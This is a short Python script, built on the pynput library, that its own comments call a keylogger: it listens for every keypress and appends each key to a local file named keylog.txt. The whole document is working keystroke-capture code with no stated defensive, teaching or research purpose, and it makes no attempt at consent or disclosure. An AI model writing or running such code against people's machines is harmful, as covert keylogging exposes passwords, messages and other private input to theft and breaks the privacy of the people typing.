from pynput.keyboard import Listener

def log_keystroke(key):
    key = str(key).replace("'", "")  # Clean key format
    with open("keylog.txt", "a") as file:
        file.write(key + "\n")

# Start keylogger
with Listener(on_press=log_keystroke) as listener:
    listener.join()
